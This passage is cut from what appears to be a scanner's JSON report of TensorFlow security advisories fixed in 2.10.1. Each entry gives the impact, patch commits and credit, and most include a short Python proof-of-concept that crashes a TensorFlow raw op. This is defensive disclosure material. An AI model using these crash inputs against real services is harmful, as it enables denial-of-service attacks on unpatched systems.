Attribution\nThis vulnerability has been reported by pattarakritr@smu.edu.sg\n",
                "markdown": "**Vulnerability CVE-2022-41909**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.10.1|[CVE-2022-41909](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41909)|\n\n### Impact\nAn input `encoded` that is not a valid `CompositeTensorVariant` tensor will trigger a segfault in [`tf.raw_ops.CompositeTensorVariantToComponents`](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/lib/core/py_func.cc).\n\n```python\nimport tensorflow as tf\n\nencode = tf.raw_ops.EmptyTensorList(element_dtype=tf.int32, element_shape=[10, 15], max_num_elements=2)\nmeta= \"\"\ncomponent=[tf.int32]\n\nprint(tf.raw_ops.CompositeTensorVariantToComponents(encoded=encode,metadata=meta,Tcomponents=component))\n```\n\n### Patches\nWe have patched the issue in GitHub commits [bf594d08d377dc6a3354d9fdb494b32d45f91971](https://github.com/tensorflow/tensorflow/commit/bf594d08d377dc6a3354d9fdb494b32d45f91971) and [660ce5a89eb6766834bdc303d2ab3902aef99d3d](https://github.com/tensorflow/tensorflow/commit/660ce5a89eb6766834bdc303d2ab3902aef99d3d).\n\nThe fix will be included in TensorFlow 2.11. We will also cherrypick this commit on TensorFlow 2.10.1, 2.9.3, and TensorFlow 2.8.4, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by pattarakritr@smu.edu.sg\n"
              },
              "properties": {
                "security-severity": "4.8",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2022-41897",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-41897"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41897",
              "help": {
                "text": "Vulnerability CVE-2022-41897\nSeverity: medium\nFixed Version: 2.10.1\nLink: [CVE-2022-41897](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41897)\n### Impact\nIf [`FractionMaxPoolGrad`](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/kernels/fractional_max_pool_op.cc) is given outsize inputs `row_pooling_sequence` and `col_pooling_sequence`, TensorFlow will crash.\n\n```python\nimport tensorflow as tf\ntf.raw_ops.FractionMaxPoolGrad(\n\torig_input = [[[[1, 1, 1, 1, 1]]]],\n    orig_output = [[[[1, 1, 1]]]],\n    out_backprop = [[[[3], [3], [6]]]],\n    row_pooling_sequence = [-0x4000000, 1, 1], \n    col_pooling_sequence = [-0x4000000, 1, 1], \n    overlapping = False\n )\n```\n\n### Patches\nWe have patched the issue in GitHub commit [d71090c3e5ca325bdf4b02eb236cfb3ee823e927](https://github.com/tensorflow/tensorflow/commit/d71090c3e5ca325bdf4b02eb236cfb3ee823e927).\n\nThe fix will be included in TensorFlow 2.11. We will also cherrypick this commit on TensorFlow 2.10.1, 2.9.3, and TensorFlow 2.8.4, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Vul AI.\n",
                "markdown": "**Vulnerability CVE-2022-41897**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.10.1|[CVE-2022-41897](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41897)|\n\n### Impact\nIf [`FractionMaxPoolGrad`](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/kernels/fractional_max_pool_op.cc) is given outsize inputs `row_pooling_sequence` and `col_pooling_sequence`, TensorFlow will crash.\n\n```python\nimport tensorflow as tf\ntf.raw_ops.FractionMaxPoolGrad(\n\torig_input = [[[[1, 1, 1, 1, 1]]]],\n    orig_output = [[[[1, 1, 1]]]],\n    out_backprop = [[[[3], [3], [6]]]],\n    row_pooling_sequence = [-0x4000000, 1, 1], \n    col_pooling_sequence = [-0x4000000, 1, 1], \n    overlapping = False\n )\n```\n\n### Patches\nWe have patched the issue in GitHub commit [d71090c3e5ca325bdf4b02eb236cfb3ee823e927](https://github.com/tensorflow/tensorflow/commit/d71090c3e5ca325bdf4b02eb236cfb3ee823e927).\n\nThe fix will be included in TensorFlow 2.11. We will also cherrypick this commit on TensorFlow 2.10.1, 2.9.3, and TensorFlow 2.8.4, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Vul AI.\n"
              },
              "properties": {
                "security-severity": "4.8",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2022-41893",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-41893"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41893",
              "help": {
                "text": "Vulnerability CVE-2022-41893\nSeverity: medium\nFixed Version: 2.10.1\nLink: [CVE-2022-41893](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41893)\n### Impact\nIf [`tf.raw_ops.TensorListResize`](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/kernels/list_kernels.cc) is given a nonscalar value for input `size`, it results `CHECK` fail which can be used to trigger a denial of service attack.\n```python\nimport numpy as np\nimport tensorflow as tf\n\na = data_structures.tf_tensor_list_new(elements = tf.constant(value=[3, 4, 5]))\nb = np.zeros([0, 2, 3, 3])\n\ntf.raw_ops.TensorListResize(input_handle=a, size=b)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [888e34b49009a4e734c27ab0c43b0b5102682c56](https://github.com/tensorflow/tensorflow/commit/888e34b49009a4e734c27ab0c43b0b5102682c56).\n\nThe fix will be included in TensorFlow 2.11. We will also cherrypick this commit on TensorFlow 2.10.1, 2.9.3, and TensorFlow 2.8.4, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Pattarakrit Rattankul\n",
                "markdown": "**Vulnerability CVE-2022-41893**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.10.1|[CVE-2022-41893](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41893)|\n\n### Impact\nIf [`tf.raw_ops.TensorListResize`](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/kernels/list_kernels.cc) is given a nonscalar value for input `size`, it results `CHECK` fail which can be used to trigger a denial of service attack.\n```python\nimport numpy as np\nimport tensorflow as tf\n\na = data_structures.tf_tensor_list_new(elements = tf.constant(value=[3, 4, 5]))\nb = np.zeros([0, 2, 3, 3])\n\ntf.raw_ops.TensorListResize(input_handle=a, size=b)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [888e34b49009a4e734c27ab0c43b0b5102682c56](https://github.com/tensorflow/tensorflow/commit/888e34b49009a4e734c27ab0c43b0b5102682c56).\n\nThe fix will be included in TensorFlow 2.11. We will also cherrypick this commit on TensorFlow 2.10.1, 2.9.3, and TensorFlow 2.8.4, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Pattarakrit Rattankul\n"
              },
              "properties": {
                "security-severity": "4.8",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2022-41911",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-41911"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41911",
              "help": {
                "text": "Vulnerability CVE-2022-41911\nSeverity: medium\nFixed Version: 2.10.1\nLink: [CVE-2022-41911](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41911)\n### Impact\nWhen [printing a tensor](https://github.com/tensorflow/tensorflow/blob/807cae8a807960fd7ac2313cde73a11fc15e7942/tensorflow/core/framework/tensor.cc#L1200-L1227), we get it`s data as a `const char*` array (since that`s the underlying storage) and then we typecast it to the element type. However, conversions from `char` to `bool` are undefined if the `char` is not `0` or `1`, so sanitizers/fuzzers will crash.\n\n### Patches\nWe have patched the issue in GitHub commit [1be743703279782a357adbf9b77dcb994fe8b508](https://github.com/tensorflow/tensorflow/commit/1be743703279782a357adbf9b77dcb994fe8b508).\n\nThe fix will be included in TensorFlow 2.11.0. We will also cherrypick this commit on TensorFlow 2.10.1, TensorFlow 2.9.3, and TensorFlow 2.8.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability was discovered via internal fuzzing.\n",
                "markdown": "**Vulnerability CVE-2022-41911**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.10.1|[CVE-2022-41911](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41911)|\n\n### Impact\nWhen [printing a tensor](https://github.com/tensorflow/tensorflow/blob/807cae8a807960fd7ac2313cde73a11fc15e7942/tensorflow/core/framework/tensor.cc#L1200-L1227), we get it`s data as a `const char*` array (since that`s the underlying storage) and then we typecast it to the element type. However, conversions from `char` to `bool` are undefined if the `char` is not `0` or `1`, so sanitizers/fuzzers will crash.\n\n### Patches\nWe have patched the issue in GitHub commit [1be743703279782a357adbf9b77dcb994fe8b508](https://github.com/tensorflow/tensorflow/commit/1be743703279782a357adbf9b77dcb994fe8b508).\n\nThe fix will be included in TensorFlow 2.11.0. We will also cherrypick this commit on TensorFlow 2.10.1, TensorFlow 2.9.3, and TensorFlow 2.8.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability was discovered via internal fuzzing.\n"
              },
              "properties": {
                "security-severity": "4.8",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2022-41896",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-41896"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41896",
              "help": {
                "text": "Vulnerability CVE-2022-41896\nSeverity: medium\nFixed Version: 2.10.1\nLink: [CVE-2022-41896](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41896)\n### Impact\nIf [`ThreadUnsafeUnigramCandidateSampler`](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/kernels/image/mirror_pad_op.cc) is given input `filterbank_channel_count` greater than the allowed max size, TensorFlow will crash.\n\n```python\nimport tensorflow as tf\ntf.raw_ops.Mfcc(\n    spectrogram = [[[1.38, 6.32, 5.75, 9.51]]],\n    sample_rate = 2,\n    upper_frequency_limit = 5.0,\n    lower_frequency_limit = 1.0,\n    filterbank_channel_count = 2**31 - 1,\n    dct_coefficient_count = 1\n)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [39ec7eaf1428e90c37787e5b3fbd68ebd3c48860](https://github.com/tensorflow/tensorflow/commit/39ec7eaf1428e90c37787e5b3fbd68ebd3c48860).\n\nThe fix will be included in TensorFlow 2.11. We will also cherrypick this commit on TensorFlow 2.10.1, 2.9.3, and TensorFlow 2.8.4, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Vul AI.\n",
                "markdown": "**Vulnerability CVE-2022-41896**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.10.1|[CVE-2022-41896](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41896)|\n\n### Impact\nIf [`ThreadUnsafeUnigramCandidateSampler`](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/kernels/image/mirror_pad_op.cc) is given input `filterbank_channel_count` greater than the allowed max size, TensorFlow will crash.\n\n```python\nimport tensorflow as tf\ntf.raw_ops.Mfcc(\n    spectrogram = [[[1.38, 6.32, 5.75, 9.51]]],\n    sample_rate = 2,\n    upper_frequency_limit = 5.0,\n    lower_frequency_limit = 1.0,\n    filterbank_channel_count = 2**31 - 1,\n    dct_coefficient_count = 1\n)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [39ec7eaf1428e90c37787e5b3fbd68ebd3c48860](https://github.com/tensorflow/tensorflow/commit/39ec7eaf1428e90c37787e5b3fbd68ebd3c48860).\n\nThe fix will be included in TensorFlow 2.11. We will also cherrypick this commit on TensorFlow 2.10.1, 2.9.3, and TensorFlow 2.8.4, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Vul AI.\n"
              },
              "properties": {
                "security-severity": "4.8",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "GHSA-xf83-q765-xm6m",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "GHSA-xf83-q765-xm6m"
              },
              "defaultConfiguration": {
                "level": "note"
              },
              "helpUri": "https://github.com/advisories/GHSA-xf83-q765-xm6m",
              "help": {
                "text": "Vulnerability GHSA-xf83-q765-xm6m\nSeverity: low\nFixed Version: 2.10.1\nLink: [GHSA-xf83-q765-xm6m](https://github.com/advisories/GHSA-xf83-q765-xm6m)\n### Impact\nAnother instance of CVE-2022-35991, where `TensorListScatter` and `TensorListScatterV2` crash via non scalar inputs in`element_shape`, was found in eager mode and fixed.\n```python\nimport tensorflow as tf\narg_0=tf.random.uniform(shape=(2, 2, 2), dtype=tf.float16, maxval=None)\narg_1=tf.random.uniform(shape=(2, 2, 2), dtype=tf.int32, maxval=65536)\narg_2=tf.random.uniform(shape=(2, 2, 2), dtype=tf.int32, maxval=65536)\narg_3=``\ntf.raw_ops.TensorListScatter(tensor=arg_0, indices=arg_1, \nelement_shape=arg_2, name=arg_3)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [bf9932fc907aff0e9e8cccf769e8b00d30fd81a1](https://github.com/tensorflow/tensorflow/commit/bf9932fc907aff0e9e8cccf769e8b00d30fd81a1).\n\nThe fix will be included in TensorFlow 2.11. We will also cherrypick this commit on TensorFlow 2.10.1, 2.9.3, and TensorFlow 2.8.4, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Pattarakrit Rattankul\n",
                "markdown": "**Vulnerability GHSA-xf83-q765-xm6m**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|low|2.10.1|[GHSA-xf83-q765-xm6m](https://github.com/advisories/GHSA-xf83-q765-xm6m)|\n\n### Impact\nAnother instance of CVE-2022-35991, where `TensorListScatter` and `TensorListScatterV2` crash via non scalar inputs in`element_shape`, was found in eager mode and fixed.\n```python\nimport tensorflow as tf\narg_0=tf.random.uniform(shape=(2, 2, 2), dtype=tf.float16, maxval=None)\narg_1=tf.random.uniform(shape=(2, 2, 2), dtype=tf.int32, maxval=65536)\narg_2=tf.random.uniform(shape=(2, 2, 2), dtype=tf.int32, maxval=65536)\narg_3=``\ntf.raw_ops.TensorListScatter(tensor=arg_0, indices=arg_1, \nelement_shape=arg_2, name=arg_3)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [bf9932fc907aff0e9e8cccf769e8b00d30fd81a1](https://github.com/tensorflow/tensorflow/commit/bf9932fc907aff0e9e8cccf769e8b00d30fd81a1).\n\nThe fix will be included in TensorFlow 2.11. We will also cherrypick this commit on TensorFlow 2.10.1, 2.9.3, and TensorFlow 2.8.4, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Pattarakrit Rattankul\n"
              },
              "properties": {
                "security-severity": "2.0",
                "tags": [
                  "vulnerability",
                  "security",
                  "low"
                ]
              }
            },
            {
              "id": "CVE-2022-41890",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-41890"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41890",
              "help": {
                "text": "Vulnerability CVE-2022-41890\nSeverity: medium\nFixed Version: 2.10.1\nLink: [CVE-2022-41890](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41890)\n### Impact\nIf [`BCast::ToShape`](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/util/bcast.h) is given input larger than an `int32`, it will crash, despite being supposed to handle up to an `int64`. An example can be seen in [`tf.experimental.numpy.outer`](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/util/bcast.h) by passing in large input to the input `b`.\n```python\nimport tensorflow as tf\nvalue = tf.constant(shape=[2, 1024, 1024, 1024], value=False)\ntf.experimental.numpy.outer(a=6,b=value)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [8310bf8dd188ff780e7fc53245058215a05bdbe5](https://github.com/tensorflow/tensorflow/commit/8310bf8dd188ff780e7fc53245058215a05bdbe5).\n\nThe fix will be included in TensorFlow 2.11. We will also cherrypick this commit on TensorFlow 2.10.1, 2.9.3, and TensorFlow 2.8.4, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Pattarakrit Rattankul.\n",
                "markdown": "**Vulnerability CVE-2022-41890**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.10.1|[CVE-2022-41890](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41890)|\n\n### Impact\nIf [`BCast::ToShape`](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/util/bcast.h) is given input larger than an `int32`, it will crash, despite being supposed to handle up to an `int64`. An example can be seen in [`tf.experimental.numpy.outer`](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/util/bcast.h) by passing in large input to the input `b`.\n```python\nimport tensorflow as tf\nvalue = tf.constant(shape=[2, 1024, 1024, 1024], value=False)\ntf.experimental.numpy.outer(a=6,b=value)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [8310bf8dd188ff780e7fc53245058215a05bdbe5](https://github.com/tensorflow/tensorflow/commit/8310bf8dd188ff780e7fc53245058215a05bdbe5).\n\nThe fix will be included in TensorFlow 2.11. We will also cherrypick this commit on TensorFlow 2.10.1, 2.9.3, and TensorFlow 2.8.4, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Pattarakrit Rattankul.\n"
              },
              "properties": {
                "security-severity": "4.8",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2022-41884",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-41884"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41884",
              "help": {
                "text": "Vulnerability CVE-2022-41884\nSeverity: medium\nFixed Version: 2.10.1\nLink: [CVE-2022-41884](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41884)\n### Impact\nIf a numpy array is created with a shape such that one element is zero and the others sum to a large number, an error will be raised. E.g. the following raises an error:\n```python\nnp.ones((0, 2**31, 2**31))\n```\nAn example of a proof of concept:\n```python\nimport numpy as np\nimport tensorflow as tf\n\ninput_val = tf.constant([1])\nshape_val = np.array([i for i in range(21)])\n\ntf.broadcast_to(input=input_val,shape=shape_val)\n```\nThe return value of `PyArray_SimpleNewFromData`, which returns null on such shapes, is not checked.\n\n### Patches\nWe have patched the issue in GitHub commit [2b56169c16e375c521a3bc8ea658811cc0793784](https://github.com/tensorflow/tensorflow/commit/2b56169c16e375c521a3bc8ea658811cc0793784).\n\nThe fix will be included in TensorFlow 2.11. We will also cherrypick this commit on TensorFlow 2.10.1, 2.9.3, and TensorFlow 2.8.4, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Pattarakrit Rattanukul.\n",
                "markdown": "**Vulnerability CVE-2022-41884**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.10.1|[CVE-2022-41884](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41884)|\n\n### Impact\nIf a numpy array is created with a shape such that one element is zero and the others sum to a large number, an error will be raised. E.g. the following raises an error:\n```python\nnp.ones((0, 2**31, 2**31))\n```\nAn example of a proof of concept:\n```python\nimport numpy as np\nimport tensorflow as tf\n\ninput_val = tf.constant([1])\nshape_val = np.array([i for i in range(21)])\n\ntf.broadcast_to(input=input_val,shape=shape_val)\n```\nThe return value of `PyArray_SimpleNewFromData`, which returns null on such shapes, is not checked.\n\n### Patches\nWe have patched the issue in GitHub commit [2b56169c16e375c521a3bc8ea658811cc0793784](https://github.com/tensorflow/tensorflow/commit/2b56169c16e375c521a3bc8ea658811cc0793784).\n\nThe fix will be included in TensorFlow 2.11. We will also cherrypick this commit on TensorFlow 2.10.1, 2.9.3, and TensorFlow 2.8.4, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Pattarakrit Rattanukul.\n"
              },
              "properties": {
                "security-severity": "4.8",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2022-41899",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-41899"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41899",
              "help": {
                "text": "Vulnerability CVE-2022-41899\nSeverity: medium\nFixed Version: 2.10.1\nLink: [CVE-2022-41899](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41899)\n### Impact\nInputs `dense_features` or `example_state_data` not of rank 2 will trigger a `CHECK` fail in [`SdcaOptimizer`](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/kernels/sdca_internal.cc).\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.SdcaOptimizer(\n    sparse_example_indices=4 * [tf.random.uniform([5,5,5,3], dtype=tf.dtypes.int64, maxval=100)],\n    sparse_feature_indices=4 * [tf.random.uniform([5,5,5,3], dtype=tf.dtypes.int64, maxval=100)],\n    sparse_feature_values=8 * [tf.random.uniform([5,5,5,3], dtype=tf.dtypes.float32, maxval=100)],\n    dense_features=4 * [tf.random.uniform([5,5,5,3], dtype=tf.dtypes.float32, maxval=100)],\n    example_weights=tf.random.uniform([5,5,5,3], dtype=tf.dtypes.float32, maxval=100),\n    example_labels=tf.random.uniform([5,5,5,3], dtype=tf.dtypes.float32, maxval=100),\n    sparse_indices=4 * [tf.random.uniform([5,5,5,3], dtype=tf.dtypes.int64, maxval=100)],\n    sparse_weights=4 * [tf.random.uniform([5,5,5,3], dtype=tf.dtypes.float32, maxval=100)],\n    dense_weights=4 * [tf.random.uniform([5,5,5,3], dtype=tf.dtypes.float32, maxval=100)],\n    example_state_data=tf.random.uniform([5,5,5,3], dtype=tf.dtypes.float32, maxval=100),\n    loss_type=\"squared_loss\",\n    l1=0.0,\n    l2=0.0,\n    num_loss_partitions=1,\n    num_inner_iterations=1,\n    adaptative=False,)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [80ff197d03db2a70c6a111f97dcdacad1b0babfa](https://github.com/tensorflow/tensorflow/commit/80ff197d03db2a70c6a111f97dcdacad1b0babfa).\n\nThe fix will be included in TensorFlow 2.11. We will also cherrypick this commit on TensorFlow 2.10.1, 2.9.3, and TensorFlow 2.8.4, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Zizhuang Deng of IIE, UCAS\n",
                "markdown": "**Vulnerability CVE-2022-41899**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.10.1|[CVE-2022-41899](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41899)|\n\n### Impact\nInputs `dense_features` or `example_state_data` not of rank 2 will trigger a `CHECK` fail in [`SdcaOptimizer`](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/kernels/sdca_internal.cc).\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.SdcaOptimizer(\n    sparse_example_indices=4 * [tf.random.uniform([5,5,5,3], dtype=tf.dtypes.int64, maxval=100)],\n    sparse_feature_indices=4 * [tf.random.uniform([5,5,5,3], dtype=tf.dtypes.int64, maxval=100)],\n    sparse_feature_values=8 * [tf.random.uniform([5,5,5,3], dtype=tf.dtypes.float32, maxval=100)],\n    dense_features=4 * [tf.random.uniform([5,5,5,3], dtype=tf.dtypes.float32, maxval=100)],\n    example_weights=tf.random.uniform([5,5,5,3], dtype=tf.dtypes.float32, maxval=100),\n    example_labels=tf.random.uniform([5,5,5,3], dtype=tf.dtypes.float32, maxval=100),\n    sparse_indices=4 * [tf.random.uniform([5,5,5,3], dtype=tf.dtypes.int64, maxval=100)],\n    sparse_weights=4 * [tf.random.uniform([5,5,5,3], dtype=tf.dtypes.float32, maxval=100)],\n    dense_weights=4 * [tf.random.uniform([5,5,5,3], dtype=tf.dtypes.float32, maxval=100)],\n    example_state_data=tf.random.uniform([5,5,5,3], dtype=tf.dtypes.float32, maxval=100),\n    loss_type=\"squared_loss\",\n    l1=0.0,\n    l2=0.0,\n    num_loss_partitions=1,\n    num_inner_iterations=1,\n    adaptative=False,)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [80ff197d03db2a70c6a111f97dcdacad1b0babfa](https://github.com/tensorflow/tensorflow/commit/80ff197d03db2a70c6a111f97dcdacad1b0babfa).\n\nThe fix will be included in TensorFlow 2.11. We will also cherrypick this commit on TensorFlow 2.10.1, 2.9.3, and TensorFlow 2.8.4, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Zizhuang Deng of IIE, UCAS\n"
              },
              "properties": {
                "security-severity": "4.8",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2022-41891",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-41891"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41891",
              "help": {
                "text": "Vulnerability CVE-2022-41891\nSeverity: medium\nFixed Version: 2.10.1\nLink: [CVE-2022-41891](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41891)\n### Impact\nIf [`tf.raw_ops.TensorListConcat`](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/kernels/list_kernels.h) is given `element_shape=[]`, it results segmentation fault which can be used to trigger a denial of service attack.\n```python\nimport tensorflow as tf\ntf.raw_ops.TensorListConcat(\n    input_handle=tf.data.experimental.to_variant(tf.data.Dataset.from_tensor_slices([1, 2, 3])),\n    element_dtype=tf.dtypes.float32,\n    element_shape=[]\n)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [fc33f3dc4c14051a83eec6535b608abe1d355fde](https://github.com/tensorflow/tensorflow/commit/fc33f3dc4c14051a83eec6535b608abe1d355fde).\n\nThe fix will be included in TensorFlow 2.11. We will also cherrypick this commit on TensorFlow 2.10.1, 2.9.3, and TensorFlow 2.8.4, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Tong Liu, ShanghaiTech University\n",
